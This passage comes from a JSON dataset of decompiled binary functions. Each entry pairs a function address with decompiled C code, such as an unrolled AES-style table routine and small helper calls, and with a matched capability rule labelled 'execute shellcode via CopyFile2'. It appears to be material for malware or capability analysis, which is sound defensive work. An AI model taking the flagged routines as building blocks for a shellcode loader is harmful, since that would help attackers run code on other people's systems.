* 4 + 0x138e0) ^ *(uVar14 * 4 + 0x13ce0) ^ uVar4 ^ uVar3 ^\n             uVar25;\n    uVar3 = *((uVar25 & 0xff) * 4 + 0x130e0);\n    uVar5 = *((uVar25 >> 8 & 0xff) * 4 + 0x134e0);\n    uVar21 = uVar25 >> 0x10 & 0xff;\n    uVar18 = *((uVar25 >> 0x18) * 4 + 0x13ce0) ^ *(uVar21 * 4 + 0x138e0) ^ *(uVar11 * 4 + 0x130e0) ^ uVar5 ^ uVar3 ^\n             uVar18;\n    uVar22 = uVar18 & 0xff;\n    uVar23 = uVar18 >> 0x18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar13 = uVar18 >> 0x10 & 0xff;\n    uVar12 = *(uVar22 * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x134e0) ^ *(uVar15 * 4 + 0x130e0) ^ *(uVar16 * 4 + 0x134e0) ^\n             *(uVar23 * 4 + 0x13ce0) ^ uVar12;\n    uVar11 = uVar12 >> 8 & 0xff;\n    uVar16 = uVar12 >> 0x10 & 0xff;\n    uVar6 = *((uVar12 >> 0x18) * 4 + 0x138e0);\n    auStack204[5] = *(uVar14 * 4 + 0x130e0) ^ *(uVar23 * 4 + 0x130e0) ^ *(uVar16 * 4 + 0x13ce0) ^ uVar4 ^ uVar6;\n    uVar4 = *(uVar23 * 4 + 0x138e0);\n    auStack204[6] =\n         *((uVar24 >> 0x18) * 4 + 0x134e0) ^ *(uVar20 * 4 + 0x130e0) ^ *(uVar16 * 4 + 0x134e0) ^ *(uVar11 * 4 + 0x138e0)\n         ^ *((uVar12 & 0xff) * 4 + 0x13ce0);\n    uVar24 = *(uVar16 * 4 + 0x130e0) ^ *(uVar11 * 4 + 0x13ce0) ^ *((uVar12 & 0xff) * 4 + 0x134e0) ^ uVar4 ^ uVar6 ^\n             uVar24;\n    uVar20 = uVar24 & 0xff;\n    auStack204[7] = *(uVar14 * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x13ce0) ^ uVar5 ^ uVar3 ^ uVar4;\n    auStack204[8] =\n         *((uVar25 >> 0x18) * 4 + 0x134e0) ^ *(uVar21 * 4 + 0x130e0) ^ *((uVar25 & 0xff) * 4 + 0x13ce0) ^\n         *(uVar22 * 4 + 0x13ce0) ^ *(uVar15 * 4 + 0x138e0);\n    uVar16 = uVar24 >> 8 & 0xff;\n    uVar3 = *(uVar16 * 4 + 0x134e0);\n    uVar14 = uVar24 >> 0x10 & 0xff;\n    uVar11 = uVar24 >> 0x18;\n    uVar18 = *(uVar15 * 4 + 0x13ce0) ^ *(uVar20 * 4 + 0x13ce0) ^ *(uVar14 * 4 + 0x138e0) ^ *(uVar11 * 4 + 0x130e0) ^\n             uVar3 ^ uVar18;\n    uVar21 = uVar18 >> 0x18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar4 = *(uVar15 * 4 + 0x134e0);\n    uVar5 = *((uVar18 & 0xff) * 4 + 0x130e0);\n    uVar26 = uVar18 >> 0x10 & 0xff;\n    uVar12 = *(uVar13 * 4 + 0x130e0) ^ *(uVar26 * 4 + 0x138e0) ^ *(uVar21 * 4 + 0x13ce0) ^ uVar5 ^ uVar4 ^ uVar12;\n    uVar13 = uVar12 >> 8 & 0xff;\n    uVar23 = uVar12 >> 0x10 & 0xff;\n    uVar25 = *(uVar22 * 4 + 0x134e0) ^ *((uVar12 & 0xff) * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x130e0) ^\n             *(uVar23 * 4 + 0x134e0) ^ *((uVar12 >> 0x18) * 4 + 0x13ce0) ^ uVar25;\n    uVar6 = *(uVar14 * 4 + 0x130e0);\n    auStack204[9] =\n         *((uVar25 >> 0x10 & 0xff) * 4 + 0x13ce0) ^ *((uVar25 >> 0x18) * 4 + 0x138e0) ^ *(uVar23 * 4 + 0x130e0) ^\n         *(uVar20 * 4 + 0x130e0) ^ uVar3;\n    uVar3 = *(uVar15 * 4 + 0x13ce0);\n    auStack204[10] =\n         *((uVar25 >> 8 & 0xff) * 4 + 0x138e0) ^ *((uVar25 & 0xff) * 4 + 0x13ce0) ^ *((uVar25 >> 0x18) * 4 + 0x134e0) ^\n         *(uVar11 * 4 + 0x134e0) ^ uVar6;\n    uVar7 = *(uVar26 * 4 + 0x130e0);\n    auStack204[11] =\n         *(uVar23 * 4 + 0x13ce0) ^ *((uVar12 >> 0x18) * 4 + 0x138e0) ^ *(uVar16 * 4 + 0x138e0) ^ uVar5 ^ uVar4;\n    auStack204[12] =\n         *((uVar12 & 0xff) * 4 + 0x13ce0) ^ *(uVar13 * 4 + 0x138e0) ^ *(uVar21 * 4 + 0x134e0) ^ uVar7 ^ uVar3;\n    uVar12 = *((uVar18 & 0xff) * 4 + 0x134e0) ^ *(uVar21 * 4 + 0x138e0) ^ *(uVar11 * 4 + 0x138e0) ^ uVar7 ^ uVar3 ^\n             uVar12;\n    uVar21 = uVar12 & 0xff;\n    uVar14 = uVar12 >> 8 & 0xff;\n    uVar3 = *((uVar12 >> 0x10 & 0xff) * 4 + 0x138e0);\n    uVar24 = *((uVar12 >> 0x18) * 4 + 0x130e0) ^ *(uVar14 * 4 + 0x134e0) ^ *(uVar21 * 4 + 0x13ce0) ^\n             *(uVar16 * 4 + 0x13ce0) ^ uVar3 ^ uVar24;\n    uVar22 = uVar24 & 0xff;\n    uVar15 = uVar24 >> 8 & 0xff;\n    uVar4 = *((uVar24 >> 0x10 & 0xff) * 4 + 0x138e0);\n    uVar5 = *((uVar24 >> 0x18) * 4 + 0x13ce0);\n    uVar18 = *(uVar15 * 4 + 0x134e0) ^ *(uVar22 * 4 + 0x130e0) ^ uVar5 ^ uVar4 ^ uVar6 ^ uVar18;\n    uVar11 = uVar18 >> 8 & 0xff;\n    uVar16 = uVar18 >> 0x18;\n    uVar6 = *(uVar11 * 4 + 0x130e0);\n    uVar23 = uVar18 >> 0x10 & 0xff;\n    uVar7 = *(uVar23 * 4 + 0x134e0);\n    uVar25 = *((uVar18 & 0xff) * 4 + 0x138e0) ^ *(uVar20 * 4 + 0x134e0) ^ *(uVar16 * 4 + 0x13ce0) ^ uVar7 ^ uVar6 ^\n             uVar25;\n    uVar20 = uVar25 >> 8 & 0xff;\n    uVar13 = uVar25 >> 0x10 & 0xff;\n    uVar8 = *((uVar18 & 0xff) * 4 + 0x134e0);\n    uVar9 = *(uVar16 * 4 + 0x138e0);\n    auStack204[13] =\n         *(uVar15 * 4 + 0x13ce0) ^ *(uVar22 * 4 + 0x138e0) ^ *(uVar21 * 4 + 0x130e0) ^ *(uVar16 * 4 + 0x130e0) ^ uVar7;\n    auStack204[14] = *(uVar22 * 4 + 0x134e0) ^ uVar6 ^ uVar5 ^ uVar4 ^ uVar8;\n    uVar4 = *((uVar25 & 0xff) * 4 + 0x134e0);\n    auStack204[15] =\n         *(uVar14 * 4 + 0x13ce0) ^ *(uVar21 * 4 + 0x138e0) ^ *((uVar25 >> 0x18) * 4 + 0x130e0) ^ *(uVar13 * 4 + 0x134e0)\n         ^ uVar9;\n    auStack204[16] =\n         *((uVar12 >> 0x18) * 4 + 0x13ce0) ^ *(uVar13 * 4 + 0x13ce0) ^ *(uVar20 * 4 + 0x130e0) ^ uVar3 ^ uVar4;\n    uVar12 = *((uVar25 >> 0x18) * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x130e0) ^ *(uVar20 * 4 + 0x13ce0) ^ uVar9 ^ uVar4 ^\n             uVar12;\n    uVar20 = uVar12 & 0xff;\n    uVar15 = uVar12 >> 8 & 0xff;\n    uVar13 = uVar12 >> 0x10 & 0xff;\n    uVar10 = uVar12 >> 0x18;\n    uVar18 = *(uVar11 * 4 + 0x13ce0) ^ *(uVar20 * 4 + 0x13ce0) ^ *(uVar15 * 4 + 0x134e0) ^ *(uVar10 * 4 + 0x130e0) ^\n             *(uVar13 * 4 + 0x138e0) ^ uVar18;\n    uVar21 = uVar18 & 0xff;\n    uVar16 = uVar18 >> 8 & 0xff;\n    uVar3 = *(uVar16 * 4 + 0x134e0);\n    uVar11 = uVar18 >> 0x10 & 0xff;\n    uVar4 = *(uVar11 * 4 + 0x138e0);\n    uVar5 = *((uVar18 >> 0x18) * 4 + 0x13ce0);\n    uVar25 = *(uVar23 * 4 + 0x130e0) ^ *(uVar21 * 4 + 0x130e0) ^ uVar3 ^ uVar4 ^ uVar5 ^ uVar25;\n    uVar6 = *((uVar25 >> 8 & 0xff) * 4 + 0x130e0);\n    uVar14 = uVar25 >> 0x10 & 0xff;\n    uVar7 = *(uVar14 * 4 + 0x134e0);\n    uVar9 = *(uVar16 * 4 + 0x13ce0);\n    uVar24 = *((uVar25 & 0xff) * 4 + 0x138e0) ^ *((uVar25 >> 0x18) * 4 + 0x13ce0) ^ uVar8 ^ uVar6 ^ uVar7 ^ uVar24;\n    auStack136[0] =\n         *((uVar25 >> 0x18) * 4 + 0x130e0) ^ *(uVar21 * 4 + 0x138e0) ^ *(uVar15 * 4 + 0x130e0) ^ uVar9 ^ uVar7;\n    auStack136[1] = *((uVar25 & 0xff) * 4 + 0x134e0) ^ uVar6 ^ uVar3 ^ uVar4 ^ uVar5;\n    uVar3 = *(uVar15 * 4 + 0x13ce0);\n    auStack136[2] =\n         *((uVar24 >> 0x10 & 0xff) * 4 + 0x134e0) ^ *((uVar24 >> 0x18) * 4 + 0x130e0) ^ *(uVar14 * 4 + 0x138e0) ^\n         *(uVar20 * 4 + 0x138e0) ^ uVar3;\n    uVar25 = *(uVar21 * 4 + 0x134e0) ^ *(uVar11 * 4 + 0x130e0) ^ *((uVar18 >> 0x18) * 4 + 0x138e0) ^\n             *(uVar10 * 4 + 0x138e0) ^ uVar9 ^ uVar25;\n    auStack136[3] =\n         *((uVar24 >> 8 & 0xff) * 4 + 0x130e0) ^ *((uVar24 & 0xff) * 4 + 0x134e0) ^ *((uVar24 >> 0x18) * 4 + 0x13ce0) ^\n         *(uVar10 * 4 + 0x13ce0) ^ *(uVar13 * 4 + 0x138e0);\n    uVar11 = uVar25 & 0xff;\n    uVar4 = *((uVar25 >> 8 & 0xff) * 4 + 0x134e0);\n    uVar16 = uVar25 >> 0x10 & 0xff;\n    uVar12 = *((uVar25 >> 0x18) * 4 + 0x130e0) ^ *(uVar16 * 4 + 0x138e0) ^ *(uVar11 * 4 + 0x13ce0) ^ uVar4 ^ uVar3 ^\n             uVar12;\n    uVar3 = *((uVar12 & 0xff) * 4 + 0x130e0);\n    uVar5 = *((uVar12 >> 8 & 0xff) * 4 + 0x134e0);\n    uVar21 = uVar12 >> 0x10 & 0xff;\n    uVar18 = *((uVar12 >> 0x18) * 4 + 0x13ce0) ^ *(uVar21 * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x130e0) ^ uVar5 ^ uVar3 ^\n             uVar18;\n    uVar22 = uVar18 & 0xff;\n    uVar23 = uVar18 >> 0x18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar13 = uVar18 >> 0x10 & 0xff;\n    uVar24 = *(uVar22 * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x134e0) ^ *(uVar15 * 4 + 0x130e0) ^ *(uVar20 * 4 + 0x134e0) ^\n             *(uVar23 * 4 + 0x13ce0) ^ uVar24;\n    uVar14 = uVar24 >> 8 & 0xff;\n    uVar20 = uVar24 >> 0x10 & 0xff;\n    uVar6 = *((uVar24 >> 0x18) * 4 + 0x138e0);\n    uVar7 = *(uVar23 * 4 + 0x138e0);\n    auStack136[4] = *(uVar11 * 4 + 0x130e0) ^ *(uVar23 * 4 + 0x130e0) ^ *(uVar20 * 4 + 0x13ce0) ^ uVar4 ^ uVar6;\n    auStack136[5] =\n         *((uVar25 >> 0x18) * 4 + 0x134e0) ^ *(uVar16 * 4 + 0x130e0) ^ *(uVar20 * 4 + 0x134e0) ^ *(uVar14 * 4 + 0x138e0)\n         ^ *((uVar24 & 0xff) * 4 + 0x13ce0);\n    auStack136[6] = *(uVar11 * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x13ce0) ^ uVar5 ^ uVar3 ^ uVar7;\n    auStack136[7] =\n         *((uVar12 >> 0x18) * 4 + 0x134e0) ^ *(uVar21 * 4 + 0x130e0) ^ *((uVar12 & 0xff) * 4 + 0x13ce0) ^\n         *(uVar22 * 4 + 0x13ce0) ^ *(uVar15 * 4 + 0x138e0);\n    uVar25 = *(uVar20 * 4 + 0x130e0) ^ *(uVar14 * 4 + 0x13ce0) ^ *((uVar24 & 0xff) * 4 + 0x134e0) ^ uVar7 ^ uVar6 ^\n             uVar25;\n    uVar20 = uVar25 & 0xff;\n    uVar16 = uVar25 >> 8 & 0xff;\n    uVar3 = *(uVar16 * 4 + 0x134e0);\n    uVar14 = uVar25 >> 0x10 & 0xff;\n    uVar11 = uVar25 >> 0x18;\n    uVar18 = *(uVar15 * 4 + 0x13ce0) ^ *(uVar20 * 4 + 0x13ce0) ^ *(uVar14 * 4 + 0x138e0) ^ *(uVar11 * 4 + 0x130e0) ^\n             uVar3 ^ uVar18;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar21 = uVar18 >> 0x18;\n    uVar4 = *(uVar15 * 4 + 0x134e0);\n    uVar5 = *((uVar18 & 0xff) * 4 + 0x130e0);\n    uVar26 = uVar18 >> 0x10 & 0xff;\n    uVar24 = *(uVar13 * 4 + 0x130e0) ^ *(uVar26 * 4 + 0x138e0) ^ *(uVar21 * 4 + 0x13ce0) ^ uVar5 ^ uVar4 ^ uVar24;\n    uVar13 = uVar24 >> 8 & 0xff;\n    uVar23 = uVar24 >> 0x10 & 0xff;\n    uVar12 = *(uVar22 * 4 + 0x134e0) ^ *((uVar24 & 0xff) * 4 + 0x138e0) ^ *(uVar13 * 4 + 0x130e0) ^\n             *(uVar23 * 4 + 0x134e0) ^ *((uVar24 >> 0x18) * 4 + 0x13ce0) ^ uVar12;\n    uVar6 = *(uVar14 * 4 + 0x130e0);\n    auStack136[8] =\n         *((uVar12 >> 0x10 & 0xff) * 4 + 0x13ce0) ^ *((uVar12 >> 0x18) * 4 + 0x138e0) ^ *(uVar23 * 4 + 0x130e0) ^\n         *(uVar20 * 4 + 0x130e0) ^ uVar3;\n    uVar3 = *(uVar15 * 4 + 0x13ce0);\n    auStack136[9] =\n         *((uVar12 >> 8 & 0xff) * 4 + 0x138e0) ^ *((uVar12 & 0xff) * 4 + 0x13ce0) ^ *((uVar12 >> 0x18) * 4 + 0x134e0) ^\n         *(uVar11 * 4 + 0x134e0) ^ uVar6;\n    uVar7 = *(uVar26 * 4 + 0x130e0);\n    auStack136[10] =\n         *(uVar23 * 4 + 0x13ce0) ^ *((uVar24 >> 0x18) * 4 + 0x138e0) ^ *(uVar16 * 4 + 0x138e0) ^ uVar5 ^ uVar4;\n    auStack136[11] =\n         *((uVar24 & 0xff) * 4 + 0x13ce0) ^ *(uVar13 * 4 + 0x138e0) ^ *(uVar21 * 4 + 0x134e0) ^ uVar7 ^ uVar3;\n    uVar24 = *((uVar18 & 0xff) * 4 + 0x134e0) ^ *(uVar21 * 4 + 0x138e0) ^ *(uVar11 * 4 + 0x138e0) ^ uVar7 ^ uVar3 ^\n             uVar24;\n    uVar15 = uVar24 & 0xff;\n    uVar11 = uVar24 >> 8 & 0xff;\n    uVar3 = *((uVar24 >> 0x10 & 0xff) * 4 + 0x138e0);\n    uVar25 = *((uVar24 >> 0x18) * 4 + 0x130e0) ^ *(uVar11 * 4 + 0x134e0) ^ *(uVar15 * 4 + 0x13ce0) ^\n             *(uVar16 * 4 + 0x13ce0) ^ uVar3 ^ uVar25;\n    uVar16 = uVar25 & 0xff;\n    uVar13 = uVar25 >> 8 & 0xff;\n    uVar4 = *((uVar25 >> 0x18) * 4 + 0x13ce0);\n    uVar5 = *((uVar25 >> 0x10 & 0xff) * 4 + 0x138e0);\n    uVar18 = *(uVar13 * 4 + 0x134e0) ^ *(uVar16 * 4 + 0x130e0) ^ uVar4 ^ uVar5 ^ uVar6 ^ uVar18;\n    uVar6 = *((uVar18 >> 8 & 0xff) * 4 + 0x130e0);\n    uVar14 = uVar18 >> 0x18;\n    uVar7 = *((uVar18 >> 0x10 & 0xff) * 4 + 0x134e0);\n    uVar12 = *((uVar18 & 0xff) * 4 + 0x138e0) ^ *(uVar20 * 4 + 0x134e0) ^ *(uVar14 * 4 + 0x13ce0) ^ uVar7 ^ uVar6 ^\n             uVar12;\n    uVar20 = uVar12 >> 0x10 & 0xff;\n    auStack136[12] =\n         *(uVar13 * 4 + 0x13ce0) ^ *(uVar16 * 4 + 0x138e0) ^ *(uVar15 * 4 + 0x130e0) ^ *(uVar14 * 4 + 0x130e0) ^ uVar7;\n    auStack136[13] = *(uVar16 * 4 + 0x134e0) ^ *((uVar18 & 0xff) * 4 + 0x134e0) ^ uVar6 ^ uVar4 ^ uVar5;\n    auStack136[15] =\n         *((uVar12 & 0xff) * 4 + 0x134e0) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x130e0) ^ *((uVar24 >> 0x18) * 4 + 0x13ce0) ^\n         *(uVar20 * 4 + 0x13ce0) ^ uVar3;\n    auStack136[14] =\n         *((uVar12 >> 0x18) * 4 + 0x130e0) ^ *(uVar11 * 4 + 0x13ce0) ^ *(uVar15 * 4 + 0x138e0) ^ *(uVar14 * 4 + 0x138e0)\n         ^ *(uVar20 * 4 + 0x134e0);\n    puVar17 = arg1 + 4;\n    iVar19 = 0;\n    do {\n        *(arg1 + iVar19 * 8) = auStack204[iVar19 + 1];\n        puVar2 = auStack136 + iVar19;\n        iVar19 = iVar19 + 1;\n        *puVar17 = *puVar2 - 0x10 & 0x1f;\n        puVar17 = puVar17 + 2;\n    } while (iVar19 < 0x10);\n    return;\n}\n",
        "token_count": 7815
    },
    "0002ee94": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0002ee94(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint auStackX16 [6];\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar auStack56 [48];\n    \n    iVar1 = fcn.00066860(auStack56, 1);\n    if (iVar1 == 0) {\n        uStack60 = 0x1f01ff;\n        uStack72 = 0x120089;\n        uStack68 = 0x120116;\n        uStack64 = 0x1200a0;\n        auStackX16[0] = 4;\n        (**0x11360)(arg1, auStackX16, auStack56, arg1 + 0x110, 1, &uStack72);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0002fce4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.0002fce4(int64_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t aiStackX8 [4];\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        iVar1 = -1;\n    }\n    else {\n        if (arg2 == -1) {\n            piVar3 = NULL;\n        }\n        else {\n            aiStackX8[0] = arg2 * -10000;\n            piVar3 = aiStackX8;\n        }\n        iVar1 = (*_fcn.00011630)(*arg1, 0, 0, 0, piVar3);\n        if (iVar1 == 0) {\n            iVar1 = 1;\n        }\n        else {\n            uVar2 = fcn.00066782();\n            fcn.00030e10(uVar2);\n            iVar1 = -(iVar1 != 0x102);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "00030334": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nbool fcn.00030334(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ulong auStackX8 [4];\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        bVar2 = false;\n    }\n    else {\n        auStackX8[0] = 0;\n        iVar1 = (*_fcn.00011630)(*arg1, 0, 0, 0, auStackX8);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 129
    },
    "0003066c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.0003066c(int64_t arg1, ulong arg2)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    int16_t *piVar4;\n    ushort uStack152;\n    int16_t iStack150;\n    int64_t iStack144;\n    uchar auStack136 [8];\n    uint uStack128;\n    ulong uStack120;\n    ushort *puStack112;\n    \n    if ((arg1 == 0) || (arg2 < 5)) {\n        uVar3 = 0x21590008;\n    }\n    else {\n        fcn.0006685a(auStack136, 0x70);\n        piVar4 = 0x11a78;\n        do {\n            iVar1 = *piVar4;\n            *(arg1 + -0x11a78 + piVar4) = iVar1;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        iStack144 = arg1 + 8;\n        uStack120 = 0x14160;\n        puStack112 = &uStack152;\n        iStack150 = arg2 * 2 + -8;\n        uStack152 = 0;\n        uStack128 = 0x24;\n        uVar2 = fcn.00066854(3, 0, auStack136, 0, 0);\n        uVar3 = fcn.00066782(uVar2);\n    }\n    return uVar3;\n}\n",
        "token_count": 332
    },
    "00030a40": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00030a40(ulong param_1, ulong param_2)\n\n{\n    uchar auStackX24 [16];\n    \n    fcn.000308e8(param_1, param_2, auStackX24);\n    return;\n}\n",
        "token_count": 56
    },
    "00031038": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.00031038(ulong arg1)\n\n{\n    int32_t iVar1;\n    uchar auStack56 [16];\n    uchar auStack40 [8];\n    uint uStack32;\n    \n    iVar1 = fcn.0006679a(arg1, auStack56, auStack40, 0x18, 5);\n    if (iVar1 != 0) {\n        uStack32 = 0xffffffff;\n    }\n    return uStack32;\n}\n",
        "token_count": 102
    },
    "000320ec": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.000320ec(ulong *arg1)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    iVar1 = fcn.00030cc4(0x78);\n    arg1[2] = iVar1;\n    (**0x113a8)(iVar1 + 0x40, 0);\n    (*_fcn.00011418)(arg1[2], 0, 0x7fffffff);\n    // WARNING: Could not recover jumptable at 0x00032141. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_fcn.00011418)(arg1[2] + 0x20, 0, 0x7fffffff);\n    return;\n}\n",
        "token_count": 185
    },
    "000360f8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.000360f8(ulong arg1, ulong arg2, ulong arg3, uint *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong uStack120;\n    int64_t iStack112;\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    uchar *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    uStack120 = 0;\n    iStack112 = 0;\n    fcn.00066704(auStack104, arg1);\n    puStack56 = auStack104;\n    auStack72[0] = 0x30;\n    uStack64 = 0;\n    uStack48 = 0x140;\n    uStack40 = 0;\n    uStack32 = 0;\n    uVar2 = fcn.000666fe(&uStack120, 1, auStack72);\n    if (uVar2 == 0) {\n        fcn.00066704(auStack88, arg2);\n        uVar1 = fcn.00030728(uStack120, auStack88, 2, &iStack112);\n        uVar2 = uVar1;\n        fcn.000666f2(uStack120);\n        if (uVar1 == 0) {\n            if (arg3 == *(iStack112 + 4)) {\n                if (*(iStack112 + 4) == 4) {\n                    *arg4 = *(iStack112 + 0xc);\n                }\n                else {\n                    uVar2 = 0xc0000001;\n                }\n            }\n            else {\n                uVar2 = 0xc0000024;\n            }\n        }\n        fcn.00030d24(iStack112);\n    }\n    return uVar2;\n}\n",
        "token_count": 416
    },
    "00037c3c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.00037c3c(void)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    ulong uVar3;\n    uchar auStackX8 [32];\n    \n    uVar3 = 0;\n    fcn.00032650(0x80038, auStackX8, 0);\n    puVar2 = *0x80030;\n    do {\n        if (puVar2 == NULL) {\ncode_r0x00037c83:\n            fcn.00032684(0x80038, auStackX8, 0);\n            return uVar3;\n        }\n        iVar1 = fcn.0003ad80(puVar2[2]);\n        puVar2[4] = iVar1;\n        if (iVar1 == 0) {\n            uVar3 = 0xc0000001;\n            goto code_r0x00037c83;\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 215
    },
    "00037f54": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00037f54(void)\n\n{\n    int64_t iVar1;\n    ulong arg1;\n    int64_t *piVar2;\n    uchar auStackX8 [8];\n    ulong uStackX16;\n    \n    arg1 = 0;\n    if (*0x80028 != 0) {\n        *0x80028 = 0;\n        while( true ) {\n            fcn.00032650(0x80038, auStackX8, 0);\n            iVar1 = *0x80030;\n            if (*0x80030 != 0) {\n                arg1 = *(*0x80030 + 0x18);\n            }\n            fcn.00032684(0x80038, auStackX8, 0);\n            if (iVar1 == 0) break;\n            fcn.00037ca0(arg1);\n        }\n        if (*0x80020 != 0) {\n            (*_fcn.00011090)();\n        }\n        fcn.0005540c(0x80050);\n        fcn.0005540c(0x80058);\n        piVar2 = 0x8e5f8;\n        do {\n            while( true ) {\n                fcn.00032650(0x8e5e0, auStackX8, 0);\n                if (*piVar2 == 0) break;\n                fcn.00032684(0x8e5e0, auStackX8, 0);\n                uStackX16 = 0xfffffffffff85ee0;\n                (**0x115e8)(0, 0);\n            }\n            fcn.00032684(0x8e5e0, auStackX8, 0);\n            piVar2 = piVar2 + 1;\n        } while (piVar2 < 0x8e678);\n        fcn.000326c0(0x8e5e0);\n        *0x7fec8 = 0;\n    }\n    return;\n}\n",
        "token_count": 438
    },
    "000385c8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.000385c8(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uStackX16;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    \n    uStackX16 = 0;\n    uStackX24 = 0;\n    fcn.00032650(0x800a0, auStackX32, 1);\n    iVar1 = fcn.000384e8(arg1, 1);\n    if (iVar1 != 0) {\n        uStackX16 = *(iVar1 + 0x10);\n        uStackX24 = *(iVar1 + 0x18);\n        *(iVar1 + 0x10) = 0;\n        *(iVar1 + 0x18) = 0;\n    }\n    fcn.00032684(0x800a0, auStackX32, 1);\n    fcn.0005540c(&uStackX16);\n    fcn.0005540c(&uStackX24);\n    return 0;\n}\n",
        "token_count": 229
    },
    "00038974": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.00038974(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    ulong uVar2;\n    int64_t **ppiVar3;\n    int64_t **arg1_00;\n    int64_t **ppiVar4;\n    uchar auStackX8 [32];\n    \n    if (arg1 == NULL) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        fcn.000385c8(arg1);\n        fcn.00032650(0x800a0, auStackX8, 1);\n        arg1_00 = *0x800c0;\n        ppiVar4 = NULL;\n        ppiVar1 = *0x800c0;\n        if (*0x800c0 != NULL) {\n            do {\n                ppiVar3 = arg1_00;\n                arg1_00 = ppiVar3;\n                if (ppiVar3[5] == arg1) break;\n                arg1_00 = *ppiVar3;\n                ppiVar4 = ppiVar3;\n            } while (arg1_00 != NULL);\n            if ((arg1_00 != NULL) && (ppiVar1 = *arg1_00,  ppiVar4 != NULL)) {\n                *ppiVar4 = *arg1_00;\n                ppiVar1 = *0x800c0;\n            }\n        }\n        *0x800c0 = ppiVar1;\n        fcn.00032684(0x800a0, auStackX8, 1);\n        if (arg1_00 == NULL) {\n            uVar2 = 0xc00000ef;\n        }\n        else {\n            fcn.00030d24(arg1_00);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 402
    },
    "00039e10": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
